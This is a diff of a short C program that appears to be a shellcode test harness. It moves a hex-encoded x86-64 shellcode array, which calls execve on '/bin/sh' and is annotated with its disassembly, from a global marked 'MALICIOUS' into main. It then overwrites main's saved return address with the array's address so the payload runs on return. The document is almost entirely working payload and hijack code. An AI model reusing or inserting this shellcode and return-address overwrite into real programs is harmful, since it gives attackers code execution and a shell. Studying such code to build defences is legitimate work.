@@ -1,26 +1,5 @@
 #undef ASSEMBLY
 
-#if !defined(ASSEMBLY)
-#define MALICIOUS __attribute__ ((section(".text")))
-
-MALICIOUS char my_execve[] =
-	"\x48\x8d\x05\x39\x11\x11\x11"          /* lea 0x11111139(%rip),%rax */
-	"\x48\x2d\x11\x11\x11\x11"              /* sub    $0x11111111,%rax   */
-	"\xff\xe0"                              /* jmpq   *%rax              */
-	"\x48\x31\xc0"                          /* xor    %rax,%rax          */
-	"\x48\x89\x44\x24\x08"                  /* mov    %rax,0x8(%rsp)     */
-	"\x48\x8b\x3c\x24"                      /* mov    (%rsp),%rdi        */
-	"\x48\x89\xe6"                          /* mov    %rsp,%rsi          */
-	"\x48\x8b\x54\x24\x08"                  /* mov    0x8(%rsp),%rdx     */
-	"\xb8\x4c\x11\x11\x11"                  /* mov    $0x1111114c,%eax   */
-	"\x2d\x11\x11\x11\x11"                  /* sub    $0x11111111,%eax   */
-	"\x0f\x05"                              /* syscall                   */
-	"\x48\x8d\x05\xd9\xff\xff\xff"          /* lea    -0x27(%rip),%rax   */
-	"\xff\xd0"                              /* callq  *%rax              */
-	"\x2f\x62\x69\x6e\x2f\x73\x68\x00"      /* .string \"/bin/sh\"       */
-	;
-#endif
-
 int main(int argc, char **argv)
 {
 	int ret = 0;
@@ -51,6 +30,23 @@ int main(int argc, char **argv)
 	__asm__(".string \"/bin/sh\"");         /* execution string for
 	                                           execve                    */
 #else
+	char my_execve[] =
+		"\x48\x8d\x05\x39\x11\x11\x11"  /* lea 0x11111139(%rip),%rax */
+		"\x48\x2d\x11\x11\x11\x11"      /* sub    $0x11111111,%rax   */
+		"\xff\xe0"                      /* jmpq   *%rax              */
+		"\x48\x31\xc0"                  /* xor    %rax,%rax          */
+		"\x48\x89\x44\x24\x08"          /* mov    %rax,0x8(%rsp)     */
+		"\x48\x8b\x3c\x24"              /* mov    (%rsp),%rdi        */
+		"\x48\x89\xe6"                  /* mov    %rsp,%rsi          */
+		"\x48\x8b\x54\x24\x08"          /* mov    0x8(%rsp),%rdx     */
+		"\xb8\x4c\x11\x11\x11"          /* mov    $0x1111114c,%eax   */
+		"\x2d\x11\x11\x11\x11"          /* sub    $0x11111111,%eax   */
+		"\x0f\x05"                      /* syscall                   */
+		"\x48\x8d\x05\xd9\xff\xff\xff"  /* lea    -0x27(%rip),%rax   */
+		"\xff\xd0"                      /* callq  *%rax              */
+		"\x2f\x62\x69\x6e\x2f\x73\x68"  /* .string \"/bin/sh\"       */
+		"\x00"
+		;
 	*(((unsigned long*)(&ret + 1)) + 1) = (unsigned long)my_execve;
 #endif
 	return ret;
